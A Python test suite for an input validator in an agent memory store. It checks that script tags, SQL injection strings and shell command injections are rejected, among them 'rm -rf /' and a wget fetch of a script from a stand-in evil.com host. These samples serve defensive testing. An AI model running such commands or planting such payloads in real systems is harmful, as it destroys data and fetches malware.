"""Tests for content validation in memory store."""

import pytest
import tempfile
from pathlib import Path
from datetime import datetime

from src.memory.store import validate_content, MemoryStore, MAX_CONTENT_SIZE
from src.memory.models import MemoryEntry, MemoryType


class TestContentValidation:
    """Test suite for content validation functionality."""
    
    def test_valid_simple_content(self):
        """Test that simple valid content passes validation."""
        content = "This is a normal memory entry about agent learning."
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert sanitized == content
        assert reason == ""
    
    def test_valid_content_with_safe_html_entities(self):
        """Test that content with safe characters passes validation."""
        content = "Agent learned about APIs: https://example.com/api & https://test.com"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert sanitized == content
        assert reason == ""
    
    def test_content_size_limit(self):
        """Test that content exceeding size limit is rejected."""
        # Create content that exceeds 10KB
        large_content = "A" * (MAX_CONTENT_SIZE + 1)
        is_valid, sanitized, reason = validate_content(large_content)
        
        assert is_valid is False
        assert sanitized == ""
        assert "exceeds size limit" in reason
    
    def test_content_at_size_limit(self):
        """Test that content exactly at size limit passes."""
        content_at_limit = "A" * MAX_CONTENT_SIZE
        is_valid, sanitized, reason = validate_content(content_at_limit)
        
        assert is_valid is True
        assert len(sanitized) == MAX_CONTENT_SIZE
    
    def test_script_tags_rejected(self):
        """Test that script tags are detected and rejected."""
        content = "Normal text <script>alert('xss')</script> more text"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "script tags" in reason.lower()
    
    def test_script_tags_variations(self):
        """Test various script tag evasion attempts."""
        variations = [
            "<script>alert('xss')</script>",
            "<SCRIPT>alert('xss')</SCRIPT>",
            "<script >alert('xss')</script >",
            "<script\n>alert('xss')</script\n>",
            "<ScRiPt>alert('xss')</sCrIpT>",
        ]
        
        for content in variations:
            is_valid, _, reason = validate_content(content)
            assert is_valid is False, f"Failed to detect: {content}"
            assert "script" in reason.lower()
    
    def test_sql_injection_union_select(self):
        """Test SQL injection detection - UNION SELECT."""
        content = "Normal entry UNION SELECT * FROM users--"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "sql injection" in reason.lower()
    
    def test_sql_injection_select_from(self):
        """Test SQL injection detection - SELECT FROM."""
        content = "Learning about SELECT password FROM admin"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "sql injection" in reason.lower()
    
    def test_sql_injection_insert_into(self):
        """Test SQL injection detection - INSERT INTO."""
        content = "Agent task INSERT INTO users VALUES (1, 'hacker')"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "sql injection" in reason.lower()
    
    def test_sql_injection_drop_table(self):
        """Test SQL injection detection - DROP TABLE."""
        content = "Memory about DROP TABLE users"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "sql injection" in reason.lower()
    
    def test_command_injection_pipe_rm(self):
        """Test command injection detection - pipe to rm."""
        content = "Process data | rm -rf /"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "command injection" in reason.lower()
    
    def test_command_injection_semicolon_wget(self):
        """Test command injection detection - semicolon wget."""
        content = "Fetch URL; wget http://evil.com/malware.sh"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "command injection" in reason.lower()
    
    def test_command_injection_backticks_bash(self):
        """Test command injection detection - backticks bash."""
        content = "Run `bash -c 'malicious code'`"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "command injection" in reason.lower()
    
    def test_command_injection_dollar_paren_python(self):
        """Test command injection detection - $(python)."""
        content = "Execute $(python -c 'import os; os.system(\"rm -rf /\")')"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "command injection" in reason.lower()
    
    def test_excessive_special_characters(self):
        """Test that excessive special characters are rejected."""
        # 40% special characters (above 30% threshold)
        content = "!@#$%^&*()!@#$%^&*()!@#$%^&*()!@#$%^&*()!@#$%^&*()!@#$"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is False
        assert "excessive special characters" in reason.lower()
    
    def test_acceptable_special_characters(self):
        """Test that acceptable level of special characters passes."""
        # Mix of normal text with some special chars (below 30% threshold)
        content = "Agent learned about APIs: https://example.com/api?key=value&other=123"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert reason == ""
    
    def test_html_escaping_safe_angle_brackets(self):
        """Test that safe angle brackets are escaped."""
        content = "Comparison: 5 < 10 and 20 > 15"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        # Should escape the angle brackets
        assert "&lt;" in sanitized or "<" in sanitized
    
    def test_empty_content(self):
        """Test that empty content passes validation."""
        content = ""
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert sanitized == ""
    
    def test_content_with_newlines(self):
        """Test that content with newlines passes validation."""
        content = "Line 1\nLine 2\nLine 3"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert "\n" in sanitized
    
    def test_validation_log_created(self):
        """Test that validation log is created for rejected content."""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_path = Path(tmpdir) / "validation.log"
            content = "<script>alert('xss')</script>"
            
            is_valid, _, reason = validate_content(content, log_path=log_path)
            
            assert is_valid is False
            assert log_path.exists()
            
            log_content = log_path.read_text()
            assert "REJECTED" in log_content
            assert "script" in log_content.lower()
            assert content[:200] in log_content


class TestMemoryStoreValidation:
    """Test that MemoryStore integrates validation correctly."""
    
    def test_write_valid_entry(self):
        """Test writing a valid memory entry."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = MemoryStore(base_path=Path(tmpdir))
            
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.LEARNING,
                content="Agent learned about memory validation",
                tags=["validation", "security"]
            )
            
            entry_id = store.write(entry)
            
            assert entry_id is not None
            assert entry_id == entry.id
    
    def test_write_rejects_script_tags(self):
        """Test that write rejects entries with script tags."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = MemoryStore(base_path=Path(tmpdir))
            
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.LEARNING,
                content="Normal text <script>alert('xss')</script>",
                tags=["test"]
            )
            
            with pytest.raises(ValueError) as exc_info:
                store.write(entry)
            
            assert "validation failed" in str(exc_info.value).lower()
            assert "script" in str(exc_info.value).lower()
    
    def test_write_rejects_sql_injection(self):
        """Test that write rejects SQL injection attempts."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = MemoryStore(base_path=Path(tmpdir))
            
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.FACT,
                content="Learning about UNION SELECT * FROM users",
                tags=["database"]
            )
            
            with pytest.raises(ValueError) as exc_info:
                store.write(entry)
            
            assert "validation failed" in str(exc_info.value).lower()
            assert "sql" in str(exc_info.value).lower()
    
    def test_write_rejects_command_injection(self):
        """Test that write rejects command injection attempts."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = MemoryStore(base_path=Path(tmpdir))
            
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.ERROR,
                content="Error processing: | rm -rf /",
                tags=["error"]
            )
            
            with pytest.raises(ValueError) as exc_info:
                store.write(entry)
            
            assert "validation failed" in str(exc_info.value).lower()
            assert "command" in str(exc_info.value).lower()
    
    def test_write_rejects_oversized_content(self):
        """Test that write rejects content exceeding size limit."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = MemoryStore(base_path=Path(tmpdir))
            
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.FACT,
                content="A" * (MAX_CONTENT_SIZE + 1000),
                tags=["large"]
            )
            
            with pytest.raises(ValueError) as exc_info:
                store.write(entry)
            
            assert "validation failed" in str(exc_info.value).lower()
            assert "size limit" in str(exc_info.value).lower()
    
    def test_validation_log_location(self):
        """Test that validation log is created in correct location."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_path = Path(tmpdir)
            store = MemoryStore(base_path=base_path)
            
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.LEARNING,
                content="<script>alert('test')</script>",
                tags=["test"]
            )
            
            with pytest.raises(ValueError):
                store.write(entry)
            
            # Check validation log was created
            validation_log = base_path / "validation.log"
            assert validation_log.exists()
            log_content = validation_log.read_text()
            assert "REJECTED" in log_content
    
    def test_sanitized_content_written(self):
        """Test that sanitized content is actually written to storage."""
        with tempfile.TemporaryDirectory() as tmpdir:
            store = MemoryStore(base_path=Path(tmpdir))
            
            # Content with angle brackets that should be escaped
            entry = MemoryEntry(
                agent_id="test-agent",
                project_id="test-project",
                type=MemoryType.LEARNING,
                content="Comparison: 5 < 10 and 20 > 15",
                tags=["test"]
            )
            
            entry_id = store.write(entry)
            
            # Read back the entry
            results = store.search(query="Comparison", agent_id="test-agent")
            
            assert len(results) > 0
            # Content should be sanitized (escaped or unchanged)
            assert "Comparison" in results[0].content


class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    def test_unicode_content(self):
        """Test that unicode content passes validation."""
        content = "Agent learned: 你好世界 🎉 Привет мир"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert reason == ""
    
    def test_code_snippets_safe(self):
        """Test that safe code snippets pass validation."""
        content = """
        def hello():
            print("Hello, World!")
            return 42
        """
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert reason == ""
    
    def test_json_content_safe(self):
        """Test that JSON content passes validation."""
        content = '{"key": "value", "number": 123, "nested": {"a": 1}}'
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert reason == ""
    
    def test_markdown_content_safe(self):
        """Test that markdown content passes validation."""
        content = "# Header\n\n**Bold** and *italic* text\n\n- List item 1\n- List item 2"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert reason == ""
    
    def test_url_content_safe(self):
        """Test that URLs pass validation."""
        content = "API docs: https://example.com/api?param=value&other=123"
        is_valid, sanitized, reason = validate_content(content)
        
        assert is_valid is True
        assert reason == ""
    
    def test_sql_keywords_in_safe_context(self):
        """Test SQL keywords in safe context (should still be caught)."""
        # This should be caught even in context because pattern is specific
        content = "We need to select from the available options"
        is_valid, sanitized, reason = validate_content(content)
        
        # Should pass because it's not "SELECT ... FROM" pattern
        assert is_valid is True
